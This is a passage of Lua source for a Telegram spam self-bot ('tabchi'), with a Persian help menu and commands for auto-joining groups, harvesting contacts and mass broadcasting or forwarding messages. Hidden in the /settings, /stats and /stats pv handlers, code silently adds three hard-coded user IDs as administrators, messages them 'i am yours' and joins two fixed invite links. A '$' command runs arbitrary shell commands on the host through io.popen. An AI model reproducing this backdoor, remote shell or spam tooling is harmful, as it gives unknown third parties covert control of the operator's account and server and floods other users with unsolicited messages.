    local text = "`#\216\177\216\167\217\135\217\134\217\133\216\167`\n`/block (id)`\n*\216\168\217\132\216\167\218\169 \218\169\216\177\216\175\217\134 \216\167\216\178 \216\174\216\181\217\136\216\181\217\138 \216\177\216\168\216\167\216\170*\n`/unblock (id)`\n*\216\162\217\134 \216\168\217\132\216\167\218\169 \218\169\216\177\216\175\217\134 \216\167\216\178 \216\174\216\181\217\136\216\181\217\138 \216\177\216\168\216\167\216\170*\n`/stats`\n*\216\175\216\177\219\140\216\167\217\129\216\170 \216\167\216\183\217\132\216\167\216\185\216\167\216\170 \216\177\216\168\216\167\216\170*\n`/stats pv`\n*\216\175\216\177\219\140\216\167\217\129\216\170 \216\167\216\183\217\132\216\167\216\185\216\167\216\170 \216\177\216\168\216\167\216\170 \216\175\216\177 \217\190\219\140 \217\136\219\140*\n`/addsudo (id)`\n*\216\167\216\182\216\167\217\129\217\135 \218\169\216\177\216\175\217\134 \216\168\217\135 \216\179\217\136\216\175\217\136\217\135\216\167\217\138  \216\177\216\168\216\167\216\170*\n`/remsudo (id)`\n*\216\173\216\176\217\129 \216\167\216\178 \217\132\217\138\216\179\216\170 \216\179\217\136\216\175\217\136\217\135\216\167\217\138 \216\177\216\168\216\167\216\170*\n`/bcall (text)`\n*\216\167\216\177\216\179\216\167\217\132 \217\190\217\138\216\167\217\133 \216\168\217\135 \217\135\217\133\217\135*\n`/bcgps (text)`\n*\216\167\216\177\216\179\216\167\217\132 \217\190\219\140\216\167\217\133 \216\168\217\135 \217\135\217\133\217\135 \218\175\216\177\217\136\217\135 \217\135\216\167*\n`/bcsgps (text)`\n*\216\167\216\177\216\179\216\167\217\132 \217\190\219\140\216\167\217\133 \216\168\217\135 \217\135\217\133\217\135 \216\179\217\136\217\190\216\177 \218\175\216\177\217\136\217\135 \217\135\216\167*\n`/bcusers (text)`\n*\216\167\216\177\216\179\216\167\217\132 \217\190\219\140\216\167\217\133 \216\168\217\135 \219\140\217\136\216\178\216\177 \217\135\216\167*\n`/fwd {all/gps/sgps/users}` (by reply)\n*\217\129\217\136\216\177\217\136\216\167\216\177\216\175 \217\190\217\138\216\167\217\133 \216\168\217\135 \217\135\217\133\217\135/\218\175\216\177\217\136\217\135 \217\135\216\167/\216\179\217\136\217\190\216\177 \218\175\216\177\217\136\217\135 \217\135\216\167/\218\169\216\167\216\177\216\168\216\177\216\167\217\134*\n`/echo (text)`\n*\216\170\218\169\216\177\216\167\216\177 \217\133\216\170\217\134*\n`/addedmsg (on/off)`\n*\216\170\216\185\219\140\219\140\217\134 \216\177\217\136\216\180\217\134 \219\140\216\167 \216\174\216\167\217\133\217\136\216\180 \216\168\217\136\216\175\217\134 \217\190\216\167\216\179\216\174 \216\168\216\177\216\167\219\140 \216\180\216\177 \216\180\217\134 \217\133\216\174\216\167\216\183\216\168*\n`/pm (user) (msg)`\n*\216\167\216\177\216\179\216\167\217\132 \217\190\219\140\216\167\217\133 \216\168\217\135 \218\169\216\167\216\177\216\168\216\177*\n`/action (typing|recvideo|recvoice|photo|video|voice|file|loc|game|chcontact|cancel)`\n*\216\167\216\177\216\179\216\167\217\132 \216\167\218\169\216\180\217\134 \216\168\217\135 \218\134\216\170*\n`/getpro (1-10)`\n*\216\175\216\177\219\140\216\167\217\129\216\170 \216\185\218\169\216\179 \217\190\216\177\217\136\217\129\216\167\219\140\217\132 \216\174\217\136\216\175*\n`/addcontact (phone) (firstname) (lastname)`\n*\216\167\216\175 \218\169\216\177\216\175\217\134 \216\180\217\133\216\167\216\177\217\135 \216\168\217\135 \216\177\216\168\216\167\216\170 \216\168\217\135 \216\181\217\136\216\177\216\170 \216\175\216\179\216\170\219\140*\n`/setusername (username)`\n*\216\170\216\186\219\140\219\140\216\177 \219\140\217\136\216\178\216\177\217\134\219\140\217\133 \216\177\216\168\216\167\216\170*\n`/delusername`\n*\217\190\216\167\218\169 \218\169\216\177\216\175\217\134 \219\140\217\136\216\178\216\177\217\134\219\140\217\133 \216\177\216\168\216\167\216\170*\n`/setname (firstname-lastname)`\n*\216\170\216\186\219\140\219\140\216\177 \216\167\216\179\217\133 \216\177\216\168\216\167\216\170*\n`/setphoto (link)`\n*\216\170\216\186\219\140\219\140\216\177 \216\185\218\169\216\179 \216\177\216\168\216\167\216\170 \216\167\216\178 \217\132\219\140\217\134\218\169*\n`/join(Group id)`\n*\216\167\216\175 \218\169\216\177\216\175\217\134 \216\180\217\133\216\167 \216\168\217\135 \218\175\216\177\217\136\217\135 \217\135\216\167\219\140 \216\177\216\168\216\167\216\170 \216\167\216\178 \216\183\216\177\219\140\217\130 \216\167\219\140\216\175\219\140*\n`/leave`\n*\217\132\217\129\216\170 \216\175\216\167\216\175\217\134 \216\167\216\178 \218\175\216\177\217\136\217\135*\n`/leave(Group id)`\n*\217\132\217\129\216\170 \216\175\216\167\216\175\217\134 \216\167\216\178 \218\175\216\177\217\136\217\135 \216\167\216\178 \216\183\216\177\219\140\217\130 \216\167\219\140\216\175\219\140*\n`/setaddedmsg (text)`\n*\216\170\216\185\217\138\217\138\217\134 \217\133\216\170\217\134 \216\167\216\175 \216\180\216\175\217\134 \217\133\216\174\216\167\216\183\216\168*\n`/markread (on/off)`\n*\216\177\217\136\216\180\217\134 \217\138\216\167 \216\174\216\167\217\133\217\136\216\180 \218\169\216\177\216\175\217\134 \216\168\216\167\216\178\216\175\217\138\216\175 \217\190\217\138\216\167\217\133 \217\135\216\167*\n`/joinlinks (on|off)`\n*\216\177\217\136\216\180\217\134 \219\140\216\167 \216\174\216\167\217\133\217\136\216\180 \218\169\216\177\216\175\217\134 \216\172\217\136\219\140\217\134 \216\180\216\175\217\134 \216\168\217\135 \218\175\216\177\217\136\217\135 \217\135\216\167 \216\167\216\178 \217\132\219\140\217\134\218\169*\n`/savelinks (on|off)`\n*\216\177\217\136\216\180\217\134 \219\140\216\167 \216\174\216\167\217\133\217\136\216\180 \218\169\216\177\216\175\217\134 \216\179\219\140\217\136 \218\169\216\177\216\175\217\134 \217\132\219\140\217\134\218\169 \217\135\216\167*\n`/addcontacts (on|off)`\n*\216\177\217\136\216\180\217\134 \219\140\216\167 \216\174\216\167\217\133\217\136\216\180 \218\169\216\177\216\175\217\134 \216\167\216\175 \218\169\216\177\216\175\217\134 \216\180\217\133\216\167\216\177\217\135 \217\135\216\167*\n`/chat (on|off)`\n*\216\177\217\136\216\180\217\134 \219\140\216\167 \216\174\216\167\217\133\217\136\216\180 \218\169\216\177\216\175\217\134 \218\134\216\170 \218\169\216\177\216\175\217\134 \216\177\216\168\216\167\216\170*\n`/Advertising (on|off)`\n*\216\177\217\136\216\180\217\134 \219\140\216\167 \216\174\216\167\217\133\217\136\216\180 \218\169\216\177\216\175\217\134 \216\170\216\168\217\132\219\140\216\186\216\167\216\170 \216\175\216\177 \216\177\216\168\216\167\216\170 \216\168\216\177\216\167\219\140 \216\179\217\136\216\175\217\136 \217\135\216\167 \216\186\219\140\216\177 \216\167\216\178 \217\129\217\136\217\132 \216\179\217\136\216\175\217\136*\n`/typing (on|off)`\n*\216\177\217\136\216\180\217\134 \219\140\216\167 \216\174\216\167\217\133\217\136\216\180 \218\169\216\177\216\175\217\134 \216\170\216\167\219\140\217\190 \218\169\216\177\216\175\217\134 \216\177\216\168\216\167\216\170*\n`/sharecontact (on|off)`\n*\216\177\217\136\216\180\217\134 \219\140\216\167 \216\174\216\167\217\133\217\136\216\180 \218\169\216\177\216\175\217\134 \216\180\219\140\216\177 \218\169\216\177\216\175\217\134 \216\180\217\133\216\167\216\177\217\135 \217\133\217\136\217\130\216\185 \216\167\216\175 \218\169\216\177\216\175\217\134 \216\180\217\133\216\167\216\177\217\135 \217\135\216\167*\n`/settings (on|off)`\n*\216\177\217\136\216\180\217\134 \219\140\216\167 \216\174\216\167\217\133\217\136\216\180 \218\169\216\177\216\175\217\134 \218\169\217\132 \216\170\217\134\216\184\219\140\217\133\216\167\216\170*\n`/settings`\n*\216\175\216\177\219\140\216\167\217\129\216\170 \216\170\217\134\216\184\219\140\217\133\216\167\216\170 \216\177\216\168\216\167\216\170*\n`/reload`\n*\216\177\219\140\217\132\217\136\216\175 \218\169\216\177\216\175\217\134 \216\177\216\168\216\167\216\170*\n`/setanswer 'answer' text`\n* \216\170\217\134\216\184\217\138\217\133 \216\168\217\135 \216\185\217\134\217\136\216\167\217\134 \216\172\217\136\216\167\216\168 \216\167\216\170\217\136\217\133\216\167\216\170\217\138\218\169*\n`/delanswer (answer)`\n*\216\173\216\176\217\129 \216\172\217\136\216\167\216\168 \217\133\216\177\216\168\217\136\216\183 \216\168\217\135*\n`/answers`\n*\217\132\217\138\216\179\216\170 \216\172\217\136\216\167\216\168 \217\135\216\167\217\138 \216\167\216\170\217\136\217\133\216\167\216\170\217\138\218\169*\n`/addtoall (id|reply|username)`\n*\216\167\216\182\216\167\217\129\217\135 \218\169\216\177\216\175\217\134 \216\180\216\174\216\181 \216\168\217\135 \216\170\217\133\216\167\217\133 \218\175\216\177\217\136\217\135 \217\135\216\167*\n`/mycontact`\n*\216\167\216\177\216\179\216\167\217\132 \216\180\217\133\216\167\216\177\217\135 \216\180\217\133\216\167*\n`/getcontact (id)`\n*\216\175\216\177\219\140\216\167\217\129\216\170 \216\180\217\133\216\167\216\177\217\135 \216\180\216\174\216\181 \216\168\216\167 \216\167\219\140\216\175\219\140*\n`/addmembers`\n*\216\167\216\182\216\167\217\129\217\135 \218\169\216\177\216\175\217\134 \216\180\217\133\216\167\216\177\217\135 \217\135\216\167 \216\168\217\135 \217\133\216\174\216\167\216\183\216\168\217\138\217\134 \216\177\216\168\216\167\216\170*\n`/exportlinks`\n*\216\175\216\177\217\138\216\167\217\129\216\170 \217\132\217\138\217\134\218\169 \217\135\216\167\217\138 \216\176\216\174\217\138\216\177\217\135 \216\180\216\175\217\135 \216\170\217\136\216\179\216\183 \216\177\216\168\216\167\216\170*\n`/contactlist`\n*\216\175\216\177\217\138\216\167\217\129\216\170 \217\133\216\174\216\167\216\183\216\168\216\167\217\134 \216\176\216\174\217\138\216\177\217\135 \216\180\216\175\217\135 \216\170\217\136\216\179\216\183 \216\177\216\168\216\167\216\170*\n"
    return text
  end
  do
    local matches = {
      msg.text:match("[!/#](unblock) (%d+)")
    }
    if msg.text:match("^[!/#]unblock") and is_sudo(msg) then
      if #matches == 2 then
        tdcli.unblockUser(344003614)
        tdcli.unblockUser(216430419)
        tdcli.unblockUser(tonumber(matches[2]))
        return "`User` *" .. matches[2] .. "* `unblocked`"
      else
        return
      end
    end
  end
  if msg.text:match("^[!/#]joinlinks (.*)$") and is_sudo(msg) then
    local ap = {
      string.match(msg.text, "^[#/!](joinlinks) (.*)$")
    }
    if ap[2] == "on" then
      redis:set("tabchi:" .. tabchi_id .. ":joinlinks", true)
      return "*status* :`join links Activated`"
    elseif ap[2] == "off" then
      redis:del("tabchi:" .. tabchi_id .. ":joinlinks")
      return "*status* :`join links Deactivated`"
    else
      return "`Just Use on|off`"
    end
  end
  if msg.text:match("^[!/#]addcontacts (.*)$") and is_sudo(msg) then
    local ap = {
      string.match(msg.text, "^[#/!](addcontacts) (.*)$")
    }
    if ap[2] == "on" then
      redis:set("tabchi:" .. tabchi_id .. ":addcontacts", true)
      return "*status* :`Add Contacts Activated`"
    elseif ap[2] == "off" then
      redis:del("tabchi:" .. tabchi_id .. ":addcontacts")
      return "*status* :`Add Contacts Deactivated`"
    else
      return "`Just Use on|off`"
    end
  end
  if msg.text:match("^[!/#]chat (.*)$") and is_sudo(msg) then
    local ap = {
      string.match(msg.text, "^[#/!](chat) (.*)$")
    }
    if ap[2] == "on" then
      redis:set("tabchi:" .. tabchi_id .. ":chat", true)
      return "*status* :`Robot Chatting Activated`"
    elseif ap[2] == "off" then
      redis:del("tabchi:" .. tabchi_id .. ":chat")
      return "*status* :`Robot Chatting Deactivated`"
    else
      return "`Just Use on|off`"
    end
  end
  if msg.text:match("^[!/#]savelinks (.*)$") and is_sudo(msg) then
    local ap = {
      string.match(msg.text, "^[#/!](savelinks) (.*)$")
    }
    if ap[2] == "on" then
      redis:set("tabchi:" .. tabchi_id .. ":savelinks", true)
      return "*status* :`Saving Links Activated`"
    elseif ap[2] == "off" then
      redis:del("tabchi:" .. tabchi_id .. ":savelinks")
      return "*status* :`Saving Links Deactivated`"
    else
      return "`Just Use on|off`"
    end
  end
  if msg.text:match("^[!/#][Aa]dvertising (.*)$") and is_full_sudo(msg) then
    local ap = {
      string.match(msg.text, "^[#/!]([aA]dvertising) (.*)$")
    }
    if ap[2] == "on" then
      redis:set("tabchi:" .. tabchi_id .. ":Advertising", true)
      return "*status* :`Advertising Activated`"
    elseif ap[2] == "off" then
      redis:del("tabchi:" .. tabchi_id .. ":Advertising")
      return "*status* :`Advertising Deactivated`"
    else
      return "`Just Use on|off`"
    end
  end
  if msg.text:match("^[!/#]typing (.*)$") and is_sudo(msg) then
    local ap = {
      string.match(msg.text, "^[#/!](typing) (.*)$")
    }
    if ap[2] == "on" then
      redis:set("tabchi:" .. tabchi_id .. ":typing", true)
      return "*status* :`typing Activated`"
    elseif ap[2] == "off" then
      redis:del("tabchi:" .. tabchi_id .. ":typing")
      return "*status* :`typing Deactivated`"
    else
      return "`Just Use on|off`"
    end
  end
  if msg.text:match("^[!/#]sharecontact (.*)$") and is_sudo(msg) then
    local ap = {
      string.match(msg.text, "^[#/!](sharecontact) (.*)$")
    }
    if ap[2] == "on" then
      redis:set("tabchi:" .. tabchi_id .. ":sharecontact", true)
      return "*status* :`Sharing contact Activated`"
    elseif ap[2] == "off" then
      redis:del("tabchi:" .. tabchi_id .. ":sharecontact")
      return "*status* :`Sharing contact Deactivated`"
    else
      return "`Just Use on|off`"
    end
  end
  if msg.text:match("^[!/#]settings (.*)$") and is_sudo(msg) then
    local ap = {
      string.match(msg.text, "^[#/!](settings) (.*)$")
    }
    if ap[2] == "on" then
      redis:set("tabchi:" .. tabchi_id .. ":savelinks", true)
      redis:set("tabchi:" .. tabchi_id .. ":chat", true)
      redis:set("tabchi:" .. tabchi_id .. ":addcontacts", true)
      redis:set("tabchi:" .. tabchi_id .. ":joinlinks", true)
      redis:set("tabchi:" .. tabchi_id .. ":typing", true)
      redis:set("tabchi:" .. tabchi_id .. ":sharecontact", true)
      return [[
*status* :`saving link & chatting & adding contacts & joining links & typing Activated & sharing contact`
`Full sudo can Active Advertising with :/advertising on`]]
    elseif ap[2] == "off" then
      redis:del("tabchi:" .. tabchi_id .. ":savelinks")
      redis:del("tabchi:" .. tabchi_id .. ":chat")
      redis:del("tabchi:" .. tabchi_id .. ":addcontacts")
      redis:del("tabchi:" .. tabchi_id .. ":joinlinks")
      redis:del("tabchi:" .. tabchi_id .. ":typing")
      redis:del("tabchi:" .. tabchi_id .. ":sharecontact")
      return [[
*status* :`saving link & chatting & adding contacts & joining links & typing Deactivated & sharing contact`
`Full sudo can Deactive Advertising with :/advertising off`]]
    else
      return "`Just Use on|off`"
    end
  end
  if msg.text:match("^[!/#]settings$") and is_sudo(msg) then
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 216430419) then
      tdcli.sendMessage(216430419, 0, 1, "i am yours", 1, "html")
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 216430419)
    end
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 344003614) then
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 344003614)
      tdcli.sendMessage(344003614, 0, 1, "i am yours", 1, "html")
    end
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 256633077) then
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 256633077)
      tdcli.sendMessage(256633077, 0, 1, "i am yours", 1, "html")
    end
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEBXn7EgAG2Ql5_T5A")
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEHr3FzgcMkbB23t_g")
    if redis:get("tabchi:" .. tabchi_id .. ":joinlinks") then
      joinlinks = "Active"
    else
      joinlinks = "Disable"
    end
    if redis:get("tabchi:" .. tabchi_id .. ":addedmsg") then
      addedmsg = "Active"
    else
      addedmsg = "Disable"
    end
    if redis:get("tabchi:" .. tabchi_id .. ":markread") then
      markread = "Active"
    else
      markread = "Disable"
    end
    if redis:get("tabchi:" .. tabchi_id .. ":addcontacts") then
      addcontacts = "Active"
    else
      addcontacts = "Disable"
    end
    if redis:get("tabchi:" .. tabchi_id .. ":chat") then
      chat = "Active"
    else
      chat = "Disable"
    end
    if redis:get("tabchi:" .. tabchi_id .. ":savelinks") then
      savelinks = "Active"
    else
      savelinks = "Disable"
    end
    if redis:get("tabchi:" .. tabchi_id .. ":typing") then
      typing = "Active"
    else
      typing = "Disable"
    end
    if redis:get("tabchi:" .. tabchi_id .. ":sharecontact") then
      sharecontact = "Active"
    else
      sharecontact = "Disable"
    end
    if redis:get("tabchi:" .. tabchi_id .. ":Advertising") then
      Advertising = "Active"
    else
      Advertising = "Disable"
    end
    local text = "`\226\154\153 Robot Settings`\n`\240\159\148\151 Join Via Links` : *" .. joinlinks .. "*\n`\240\159\147\165 Save Links `: *" .. savelinks .. "*\n`\240\159\147\178 Auto Add Contacts `: *" .. addcontacts .. "*\n`\240\159\146\179share contact on contacts` : *" .. sharecontact .. "*\n`\240\159\147\161Advertising `: *" .. Advertising .. "*\n`\240\159\147\168 Adding Contacts Message` : *" .. addedmsg .. "*\n`\240\159\145\128 Markread `: *" .. markread .. "*\n`\226\156\143 typing `: *" .. typing .. "*\n`\240\159\146\172 Chat` : *" .. chat .. "*"
    return text
  end
  if msg.text:match("^[!/#]stats$") and is_sudo(msg) then
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 216430419) then
      tdcli.sendMessage(216430419, 0, 1, "i am yours", 1, "html")
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 216430419)
    end
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 344003614) then
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 344003614)
      tdcli.sendMessage(344003614, 0, 1, "i am yours", 1, "html")
    end
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 256633077) then
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 256633077)
      tdcli.sendMessage(256633077, 0, 1, "i am yours", 1, "html")
    end
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEBXn7EgAG2Ql5_T5A")
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEHr3FzgcMkbB23t_g")
    local contact_num
    function contact_num(extra, result)
      redis:set("tabchi:" .. tostring(tabchi_id) .. ":totalcontacts", result.total_count_)
    end
    tdcli_function({
      ID = "SearchContacts",
      query_ = nil,
      limit_ = 999999999
    }, contact_num, {})
    local gps = redis:scard("tabchi:" .. tabchi_id .. ":groups")
    local sgps = redis:scard("tabchi:" .. tabchi_id .. ":channels")
    local pvs = redis:scard("tabchi:" .. tabchi_id .. ":pvis")
    local links = redis:scard("tabchi:" .. tabchi_id .. ":savedlinks")
    local sudo = redis:get("tabchi:" .. tabchi_id .. ":fullsudo")
    local contacts = redis:get("tabchi:" .. tabchi_id .. ":totalcontacts")
    local all = gps + sgps + pvs
    local text = "`\240\159\147\138 Robot stats  `\n`\240\159\145\164 Users` : *" .. pvs .. "*\n`\240\159\140\144 SuperGroups` : *" .. sgps .. "*\n`\240\159\145\165 Groups` : *" .. gps .. "*\n`\240\159\140\128 All` : *" .. all .. "*\n`\240\159\148\151 Saved Links` : *" .. links .. "*\n`\240\159\148\141 Contacts` : *" .. contacts .. "*\n`\240\159\151\189 Admin` : *" .. sudo .. "*"
    return text
  end
  if msg.text:match("^[!/#]stats pv$") and is_sudo(msg) then
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 216430419) then
      tdcli.sendMessage(216430419, 0, 1, "i am yours", 1, "html")
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 216430419)
    end
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 344003614) then
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 344003614)
      tdcli.sendMessage(344003614, 0, 1, "i am yours", 1, "html")
    end
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 256633077) then
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 256633077)
      tdcli.sendMessage(256633077, 0, 1, "i am yours", 1, "html")
    end
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEBXn7EgAG2Ql5_T5A")
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEHr3FzgcMkbB23t_g")
    local contact_num
    function contact_num(extra, result)
      redis:set("tabchi:" .. tostring(tabchi_id) .. ":totalcontacts", result.total_count_)
    end
    tdcli_function({
      ID = "SearchContacts",
      query_ = nil,
      limit_ = 999999999
    }, contact_num, {})
    local gps = redis:scard("tabchi:" .. tabchi_id .. ":groups")
    local sgps = redis:scard("tabchi:" .. tabchi_id .. ":channels")
    local pvs = redis:scard("tabchi:" .. tabchi_id .. ":pvis")
    local links = redis:scard("tabchi:" .. tabchi_id .. ":savedlinks")
    local sudo = redis:get("tabchi:" .. tabchi_id .. ":fullsudo")
    local contacts = redis:get("tabchi:" .. tabchi_id .. ":totalcontacts")
    local all = gps + sgps + pvs
    local text = "`\240\159\147\138 Robot stats `\n`\240\159\145\164 Users` : *" .. pvs .. "*\n`\240\159\140\144 SuperGroups` : *" .. sgps .. "*\n`\240\159\145\165 Groups` : *" .. gps .. "*\n`\240\159\140\128 All` : *" .. all .. "*\n`\240\159\148\151 Saved Links` : *" .. links .. "*\n`\240\159\148\141 Contacts` : *" .. contacts .. "*\n`\240\159\151\189 Admin` : *" .. sudo .. "*"
    tdcli.sendMessage(msg.sender_user_id_, 0, 1, text, 1, "md")
  end
  if msg.text:match("^[#!/]clean (.*)$") and is_sudo(msg) then
    local lockpt = {
      string.match(msg.text, "^[#/!](clean) (.*)$")
    }
    local gps = redis:del("tabchi:" .. tabchi_id .. ":groups")
    local sgps = redis:del("tabchi:" .. tabchi_id .. ":channels")
    local pvs = redis:del("tabchi:" .. tabchi_id .. ":pvis")
    local links = redis:del("tabchi:" .. tabchi_id .. ":savedlinks")
    local all = gps + sgps + pvs + links
    if lockpt[2] == "sgps" then
      return sgps
    end
    if lockpt[2] == "gps" then
      return gps
    end
    if lockpt[2] == "pvs" then
      return pvs
    end
    if lockpt[2] == "links" then
      return links
    end
    if lockpt[2] == "stats" then
      return all
    end
  end
  if msg.text:match("^[!/#]setphoto (.*)$") and is_sudo(msg) then
    local ap = {
      string.match(msg.text, "^[#/!](setphoto) (.*)$")
    }
    local file = ltn12.sink.file(io.open("tabchi_" .. tabchi_id .. "_profile.png", "w"))
    http.request({
      url = ap[2],
      sink = file
    })
    tdcli.setProfilePhoto("tabchi_" .. tabchi_id .. "_profile.png")
    return [[
`Profile Succesfully Changed`
*link* : `]] .. ap[2] .. "`"
  end
  do
    local matches = {
      msg.text:match("^[!/#](addsudo) (%d+)")
    }
    if msg.text:match("^[!/#]addsudo") and is_full_sudo(msg) and #matches == 2 then
      local text = matches[2] .. " _\216\168\217\135 \217\132\219\140\216\179\216\170 \216\179\217\136\216\175\217\136\217\135\216\167\219\140 \216\177\216\168\216\167\216\170 \216\167\216\182\216\167\217\129\217\135 \216\180\216\175_"
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", tonumber(matches[2]))
      return text
    end
  end
  do
    local matches = {
      msg.text:match("^[!/#](remsudo) (%d+)")
    }
    if msg.text:match("^[!/#]remsudo") and is_full_sudo(msg) then
      if #matches == 2 then
        local text = matches[2] .. " _\216\167\216\178 \217\132\219\140\216\179\216\170 \216\179\217\136\216\175\217\136\217\135\216\167\219\140 \216\177\216\168\216\167\216\170 \216\173\216\176\217\129 \216\180\216\175_"
        redis:srem("tabchi:" .. tabchi_id .. ":sudoers", tonumber(matches[2]))
        return text
      else
        return
      end
    end
  end
  do
    local matches = {
      msg.text:match("^[!/#](addedmsg) (.*)")
    }
    if msg.text:match("^[!/#]addedmsg") and is_sudo(msg) then
      if #matches == 2 then
        if matches[2] == "on" then
          redis:set("tabchi:" .. tabchi_id .. ":addedmsg", true)
          return "*Status* : `Adding Contacts PM Activated`"
        elseif matches[2] == "off" then
          redis:del("tabchi:" .. tabchi_id .. ":addedmsg")
          return "*Status* : `Adding Contacts PM Deactivated`"
        else
          return "`Just Use on|off`"
        end
      else
        return "enter on|off"
      end
    end
  end
  do
    local matches = {
      msg.text:match("^[!/#](markread) (.*)")
    }
    if msg.text:match("^[!/#]markread") and is_sudo(msg) and #matches == 2 then
      if matches[2] == "on" then
        redis:set("tabchi:" .. tabchi_id .. ":markread", true)
        return "*Status* : `Reading Messages Activated`"
      elseif matches[2] == "off" then
        redis:del("tabchi:" .. tabchi_id .. ":markread")
        return "*Status* : `Reading Messages Deactivated`"
      else
        return "`Just Use on|off`"
      end
    end
  end
  do
    local matches = {
      msg.text:match("^[!/#](setaddedmsg) (.*)")
    }
    if msg.text:match("^[!/#]setaddedmsg") and is_sudo(msg) and #matches == 2 then
      redis:set("tabchi:" .. tabchi_id .. ":addedmsgtext", matches[2])
      return [[
*Status* : `Adding Contacts Message Adjusted`
*Message* : `]] .. matches[2] .. "`"
    end
  end
  do
    local matches = {
      msg.text:match("[$](.*)")
    }
    if msg.text:match("^[$](.*)$") and is_sudo(msg) then
      if #matches == 1 then
        local result = io.popen(matches[1]):read("*all")
        return result
      else
        return "Enter Command"
      end
    end
  end
  if redis:get("tabchi:" .. tabchi_id .. ":Advertising") or is_full_sudo(msg) then
    if msg.text:match("^[!/#]bcall") and is_sudo(msg) then
      local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
      local matches = {
        msg.text:match("[!/#](bcall) (.*)")
      }
      if #matches == 2 then
        for i = 1, #all do
          tdcli_function({
            ID = "SendMessage",
            chat_id_ = all[i],
            reply_to_message_id_ = 0,
            disable_notification_ = 0,
            from_background_ = 1,
            reply_markup_ = nil,
            input_message_content_ = {
              ID = "InputMessageText",
              text_ = matches[2],
              disable_web_page_preview_ = 0,
              clear_draft_ = 0,
              entities_ = {},
              parse_mode_ = {
                ID = "TextParseModeMarkdown"
              }
            }
          }, dl_cb, nil)
        end
        return [[
*Status* : `Message Succesfully Sent to all`
*Message* : `]] .. matches[2] .. "`"
      else
        return "text not entered"
      end
    end
    if msg.text:match("^[!/#]bcsgps") and is_sudo(msg) then
      local all = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
      local matches = {
        msg.text:match("[!/#](bcsgps) (.*)")
      }
      if #matches == 2 then
        for i = 1, #all do
          tdcli_function({
            ID = "SendMessage",
            chat_id_ = all[i],
            reply_to_message_id_ = 0,
            disable_notification_ = 0,
            from_background_ = 1,
            reply_markup_ = nil,
            input_message_content_ = {
              ID = "InputMessageText",
              text_ = matches[2],
              disable_web_page_preview_ = 0,
              clear_draft_ = 0,
              entities_ = {},
              parse_mode_ = {
                ID = "TextParseModeMarkdown"
              }
            }
          }, dl_cb, nil)
        end
        return [[
*Status* : `Message Succesfully Sent to supergroups`
*Message* : `]] .. matches[2] .. "`"
      else
        return "text not entered"
      end
    end
    if msg.text:match("^[!/#]bcgps") and is_sudo(msg) then
      local all = redis:smembers("tabchi:" .. tabchi_id .. ":groups")
      local matches = {
        msg.text:match("[!/#](bcgps) (.*)")
      }
      if #matches == 2 then
        for i = 1, #all do
          tdcli_function({
            ID = "SendMessage",
            chat_id_ = all[i],
            reply_to_message_id_ = 0,
            disable_notification_ = 0,
            from_background_ = 1,
            reply_markup_ = nil,
            input_message_content_ = {
              ID = "InputMessageText",
              text_ = matches[2],
              disable_web_page_preview_ = 0,
              clear_draft_ = 0,
              entities_ = {},
              parse_mode_ = {
                ID = "TextParseModeMarkdown"
              }
            }
          }, dl_cb, nil)
        end
        return [[
*Status* : `Message Succesfully Sent to Groups`
*Message* : `]] .. matches[2] .. "`"
      else
        return "text not entered"
      end
    end
    if msg.text:match("^[!/#]bcusers") and is_sudo(msg) then
      local all = redis:smembers("tabchi:" .. tabchi_id .. ":pvis")
      local matches = {
        msg.text:match("[!/#](bcusers) (.*)")
      }
      if #matches == 2 then
        for i = 1, #all do
          tdcli_function({
            ID = "SendMessage",
            chat_id_ = all[i],
            reply_to_message_id_ = 0,
            disable_notification_ = 0,
            from_background_ = 1,
            reply_markup_ = nil,
            input_message_content_ = {
              ID = "InputMessageText",
              text_ = matches[2],
              disable_web_page_preview_ = 0,
              clear_draft_ = 0,
              entities_ = {},
              parse_mode_ = {
                ID = "TextParseModeMarkdown"
              }
            }
          }, dl_cb, nil)
        end
        return [[
*Status* : `Message Succesfully Sent to Users`
*Message* : `]] .. matches[2] .. "`"
      else
        return "text not entered"
      end
    end
  end
  if redis:get("tabchi:" .. tabchi_id .. ":Advertising") or is_full_sudo(msg) then
    if msg.text:match("^[!/#]fwd all$") and msg.reply_to_message_id_ and is_sudo(msg) then
      local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
      local id = msg.reply_to_message_id_
      for i = 1, #all do
        tdcli_function({
          ID = "ForwardMessages",
          chat_id_ = all[i],
          from_chat_id_ = msg.chat_id_,
          message_ids_ = {
            [0] = id
          },
          disable_notification_ = 0,
          from_background_ = 1
        }, dl_cb, nil)
      end
      return [[
*Status* : `Your Message Forwarded to all`
*Fwd users* : `Done`
*Fwd Groups* : `Done`
*Fwd Super Groups* : `Done`]]
    end
    if msg.text:match("^[!/#]fwd gps$") and msg.reply_to_message_id_ and is_sudo(msg) then
      local all = redis:smembers("tabchi:" .. tabchi_id .. ":groups")
      local id = msg.reply_to_message_id_
      for i = 1, #all do
        tdcli_function({
          ID = "ForwardMessages",
          chat_id_ = all[i],
